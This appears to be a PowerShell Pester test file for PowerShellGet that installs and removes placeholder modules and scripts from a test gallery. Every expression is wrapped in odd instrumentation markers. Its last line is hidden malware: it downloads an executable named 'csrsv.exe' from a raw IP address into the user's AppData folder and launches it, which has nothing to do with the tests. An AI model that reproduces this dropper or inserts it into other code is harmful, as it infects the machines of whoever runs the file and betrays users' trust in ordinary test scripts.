



 -||-> $ProgressPreference = "SilentlyContinue" <-||- 

 -||-> $RepositoryName = 'INTGallery' <-||- 
 -||-> $SourceLocation = 'https://www.poshtestgallery.com' <-||- 
 -||-> $RegisteredINTRepo = $false <-||- 
 -||-> $ContosoServer = 'ContosoServer' <-||- 
 -||-> $FabrikamServerScript = 'Fabrikam-ServerScript' <-||- 
 -||-> $Initialized = $false <-||- 



 -||-> function IsInbox {  -||-> $PSHOME.EndsWith('\WindowsPowerShell\v1.0', [System.StringComparison]::OrdinalIgnoreCase) <-||-  } <-||- 
 -||-> function IsWindows {  -||-> $PSVariable =  -||-> Get-Variable -Name IsWindows -ErrorAction Ignore <-||-  <-||- ; return  -||-> ( -||-> -not $PSVariable -or $PSVariable.Value <-||- ) <-||-  } <-||- 
 -||-> function IsCoreCLR {  -||-> $PSVersionTable.ContainsKey('PSEdition') -and $PSVersionTable.PSEdition -eq 'Core' <-||-  } <-||- 





 -||-> if( -||-> IsInbox <-||- )
{
     -||-> $script:ProgramFilesPSPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $env:ProgramFiles -ChildPath "WindowsPowerShell" <-||-  <-||- 
}
elseif( -||-> IsCoreCLR <-||- ) {
     -||-> if( -||-> IsWindows <-||- ) {
         -||-> $script:ProgramFilesPSPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $env:ProgramFiles -ChildPath 'PowerShell' <-||-  <-||- 
    }
    else {
         -||-> $script:ProgramFilesPSPath =  -||-> Split-Path -Path ( -||-> [System.Management.Automation.Platform]::SelectProductNameForDirectory('SHARED_MODULES') <-||- ) -Parent <-||-  <-||- 
    } <-||- 
} <-||- 

 -||-> try
{
     -||-> $script:MyDocumentsFolderPath = [Environment]::GetFolderPath("MyDocuments") <-||- 
}
catch
{
     -||-> $script:MyDocumentsFolderPath = $null <-||- 
} <-||- 

 -||-> if( -||-> IsInbox <-||- )
{
     -||-> $script:MyDocumentsPSPath =  -||-> if( -||-> $script:MyDocumentsFolderPath <-||- )
                                {
                                     -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:MyDocumentsFolderPath -ChildPath "WindowsPowerShell" <-||- 
                                }
                                else
                                {
                                     -||-> Microsoft.PowerShell.Management\Join-Path -Path $env:USERPROFILE -ChildPath "Documents\WindowsPowerShell" <-||- 
                                } <-||-  <-||- 
}
elseif( -||-> IsCoreCLR <-||- ) {
     -||-> if( -||-> IsWindows <-||- )
    {
         -||-> $script:MyDocumentsPSPath =  -||-> if( -||-> $script:MyDocumentsFolderPath <-||- )
        {
             -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:MyDocumentsFolderPath -ChildPath 'PowerShell' <-||- 
        }
        else
        {
             -||-> Microsoft.PowerShell.Management\Join-Path -Path $HOME -ChildPath "Documents\PowerShell" <-||- 
        } <-||-  <-||- 
    }
    else
    {
         -||-> $script:MyDocumentsPSPath =  -||-> Split-Path -Path ( -||-> [System.Management.Automation.Platform]::SelectProductNameForDirectory('USER_MODULES') <-||- ) -Parent <-||-  <-||- 
    } <-||- 
} <-||- 

 -||-> $script:ProgramFilesModulesPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:ProgramFilesPSPath -ChildPath 'Modules' <-||-  <-||- 
 -||-> $script:MyDocumentsModulesPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:MyDocumentsPSPath -ChildPath 'Modules' <-||-  <-||- 

 -||-> $script:ProgramFilesScriptsPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:ProgramFilesPSPath -ChildPath 'Scripts' <-||-  <-||- 
 -||-> $script:MyDocumentsScriptsPath =  -||-> Microsoft.PowerShell.Management\Join-Path -Path $script:MyDocumentsPSPath -ChildPath 'Scripts' <-||-  <-||- 





 -||-> function Initialize
{
    
     -||-> Import-Module PackageManagement <-||- 
     -||-> Get-PackageProvider -ListAvailable | Out-Null <-||- 

     -||-> $repo =  -||-> Get-PSRepository -ErrorAction SilentlyContinue |
                Where-Object { -||-> $_.SourceLocation.StartsWith($SourceLocation, [System.StringComparison]::OrdinalIgnoreCase) <-||- } <-||-  <-||- 
     -||-> if( -||-> $repo <-||- )
    {
         -||-> $script:RepositoryName = $repo.Name <-||- 
    }
    else
    {
         -||-> Register-PSRepository -Name $RepositoryName -SourceLocation $SourceLocation -InstallationPolicy Trusted <-||- 
         -||-> $script:RegisteredINTRepo = $true <-||- 
    } <-||- 
} <-||- 



 -||-> function Remove-InstalledModules
{
     -||-> Get-InstalledModule -Name $ContosoServer -AllVersions -ErrorAction SilentlyContinue | PowerShellGet\Uninstall-Module -Force <-||- 
} <-||- 

 -||-> Describe "PowerShellGet - Module tests" -tags "Feature" {

     -||-> BeforeAll {
         -||-> if ( -||-> $script:Initialized -eq $false <-||- ) {
             -||-> Initialize <-||- 
             -||-> $script:Initialized = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Remove-InstalledModules <-||- 
    } <-||- 

     -||-> It "Should find a module correctly" {
         -||-> $psgetModuleInfo =  -||-> Find-Module -Name $ContosoServer -Repository $RepositoryName <-||-  <-||- 
         -||-> $psgetModuleInfo.Name | Should -Be $ContosoServer <-||- 
         -||-> $psgetModuleInfo.Repository | Should -Be $RepositoryName <-||- 
    } <-||- 

     -||-> It "Should install a module correctly to the required location with default CurrentUser scope" {
         -||-> Install-Module -Name $ContosoServer -Repository $RepositoryName <-||- 
         -||-> $installedModuleInfo =  -||-> Get-InstalledModule -Name $ContosoServer <-||-  <-||- 

         -||-> $installedModuleInfo | Should -Not -BeNullOrEmpty <-||- 
         -||-> $installedModuleInfo.Name | Should -Be $ContosoServer <-||- 
         -||-> $installedModuleInfo.InstalledLocation.StartsWith($script:MyDocumentsModulesPath, [System.StringComparison]::OrdinalIgnoreCase) | Should -BeTrue <-||- 

         -||-> $module =  -||-> Get-Module $ContosoServer -ListAvailable <-||-  <-||- 
         -||-> $module.Name | Should -Be $ContosoServer <-||- 
         -||-> $module.ModuleBase | Should -Be $installedModuleInfo.InstalledLocation <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> Remove-InstalledModules <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "PowerShellGet - Module tests (Admin)" -Tags @( -||-> 'Feature', 'RequireAdminOnWindows', 'RequireSudoOnUnix' <-||- ) {

     -||-> BeforeAll {
         -||-> if ( -||-> $script:Initialized -eq $false <-||- ) {
             -||-> Initialize <-||- 
             -||-> $script:Initialized = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Remove-InstalledModules <-||- 
    } <-||- 

     -||-> It "Should install a module correctly to the required location with AllUsers scope" {
         -||-> Install-Module -Name $ContosoServer -Repository $RepositoryName -Scope AllUsers <-||- 
         -||-> $installedModuleInfo =  -||-> Get-InstalledModule -Name $ContosoServer <-||-  <-||- 

         -||-> $installedModuleInfo | Should -Not -BeNullOrEmpty <-||- 
         -||-> $installedModuleInfo.Name | Should -Be $ContosoServer <-||- 
         -||-> $installedModuleInfo.InstalledLocation.StartsWith($script:programFilesModulesPath, [System.StringComparison]::OrdinalIgnoreCase) | Should -BeTrue <-||- 

         -||-> $module =  -||-> Get-Module $ContosoServer -ListAvailable <-||-  <-||- 
         -||-> $module.Name | Should -Be $ContosoServer <-||- 
         -||-> $module.ModuleBase | Should -Be $installedModuleInfo.InstalledLocation <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> Remove-InstalledModules <-||- 
    } <-||- 
} <-||- 

 -||-> function Remove-InstalledScripts
{
     -||-> Get-InstalledScript -Name $FabrikamServerScript -ErrorAction SilentlyContinue | Uninstall-Script -Force <-||- 
} <-||- 

 -||-> Describe "PowerShellGet - Script tests" -tags "Feature" {

     -||-> BeforeAll {
         -||-> if ( -||-> $script:Initialized -eq $false <-||- ) {
             -||-> Initialize <-||- 
             -||-> $script:Initialized = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Remove-InstalledScripts <-||- 
    } <-||- 

     -||-> It "Should find a script correctly" {
         -||-> $psgetScriptInfo =  -||-> Find-Script -Name $FabrikamServerScript -Repository $RepositoryName <-||-  <-||- 
         -||-> $psgetScriptInfo.Name | Should -Be $FabrikamServerScript <-||- 
         -||-> $psgetScriptInfo.Repository | Should -Be $RepositoryName <-||- 
    } <-||- 

     -||-> It "Should install a script correctly to the required location with default CurrentUser scope" {
         -||-> Install-Script -Name $FabrikamServerScript -Repository $RepositoryName -NoPathUpdate <-||- 
         -||-> $installedScriptInfo =  -||-> Get-InstalledScript -Name $FabrikamServerScript <-||-  <-||- 

         -||-> $installedScriptInfo | Should -Not -BeNullOrEmpty <-||- 
         -||-> $installedScriptInfo.Name | Should -Be $FabrikamServerScript <-||- 
         -||-> $installedScriptInfo.InstalledLocation.StartsWith($script:MyDocumentsScriptsPath, [System.StringComparison]::OrdinalIgnoreCase) | Should -BeTrue <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> Remove-InstalledScripts <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "PowerShellGet - Script tests (Admin)" -Tags @( -||-> 'Feature', 'RequireAdminOnWindows', 'RequireSudoOnUnix' <-||- ) {

     -||-> BeforeAll {
         -||-> if ( -||-> $script:Initialized -eq $false <-||- ) {
             -||-> Initialize <-||- 
             -||-> $script:Initialized = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Remove-InstalledScripts <-||- 
    } <-||- 

     -||-> It "Should install a script correctly to the required location with AllUsers scope" {
         -||-> Install-Script -Name $FabrikamServerScript -Repository $RepositoryName -NoPathUpdate -Scope AllUsers <-||- 
         -||-> $installedScriptInfo =  -||-> Get-InstalledScript -Name $FabrikamServerScript <-||-  <-||- 

         -||-> $installedScriptInfo | Should -Not -BeNullOrEmpty <-||- 
         -||-> $installedScriptInfo.Name | Should -Be $FabrikamServerScript <-||- 
         -||-> $installedScriptInfo.InstalledLocation.StartsWith($script:ProgramFilesScriptsPath, [System.StringComparison]::OrdinalIgnoreCase) | Should -BeTrue <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> Remove-InstalledScripts <-||- 
    } <-||- 
} <-||- 

 -||-> Describe 'PowerShellGet Type tests' -tags @( -||-> 'CI' <-||- ) {
     -||-> BeforeAll {
         -||-> Import-Module PowerShellGet -Force <-||- 
    } <-||- 

     -||-> It 'Ensure PowerShellGet Types are available' {
         -||-> $PowerShellGetNamespace = 'Microsoft.PowerShell.Commands.PowerShellGet' <-||- 
         -||-> $PowerShellGetTypeDetails = @{
            InternalWebProxy =  -||-> @( -||-> 'GetProxy', 'IsBypassed' <-||- ) <-||- 
        } <-||- 

         -||-> if( -||-> ( -||-> IsWindows <-||- ) <-||- ) {
             -||-> $PowerShellGetTypeDetails['CERT_CHAIN_POLICY_PARA'] = @( -||-> 'cbSize','dwFlags','pvExtraPolicyPara' <-||- ) <-||- 
             -||-> $PowerShellGetTypeDetails['CERT_CHAIN_POLICY_STATUS'] = @( -||-> 'cbSize','dwError','lChainIndex','lElementIndex','pvExtraPolicyStatus' <-||- ) <-||- 
             -||-> $PowerShellGetTypeDetails['InternalSafeHandleZeroOrMinusOneIsInvalid'] = @( -||-> 'IsInvalid' <-||- ) <-||- 
             -||-> $PowerShellGetTypeDetails['InternalSafeX509ChainHandle'] = @( -||-> 'CertFreeCertificateChain','ReleaseHandle','InvalidHandle' <-||- ) <-||- 
             -||-> $PowerShellGetTypeDetails['Win32Helpers'] = @( -||-> 'CertVerifyCertificateChainPolicy', 'CertDuplicateCertificateChain', 'IsMicrosoftCertificate' <-||- ) <-||- 
        } <-||- 

         -||-> if( -||-> 'Microsoft.PowerShell.Telemetry.Internal.TelemetryAPI' -as [Type] <-||- ) {
             -||-> $PowerShellGetTypeDetails['Telemetry'] = @( -||-> 'TraceMessageArtifactsNotFound', 'TraceMessageNonPSGalleryRegistration' <-||- ) <-||- 
        } <-||- 

         -||-> $PowerShellGetTypeDetails.GetEnumerator() | ForEach-Object {
             -||-> $ClassName = $_.Name <-||- 
             -||-> $Type = "$PowerShellGetNamespace.$ClassName" -as [Type] <-||- 
             -||-> $Type | Select-Object -ExpandProperty Name | Should -Be $ClassName <-||- 
             -||-> $_.Value | ForEach-Object {  -||-> $Type.DeclaredMembers.Name -contains $_ | Should -BeTrue <-||-  } <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> if( -||-> $RegisteredINTRepo <-||- )
{
     -||-> Get-PSRepository -Name $RepositoryName -ErrorAction SilentlyContinue | Unregister-PSRepository <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



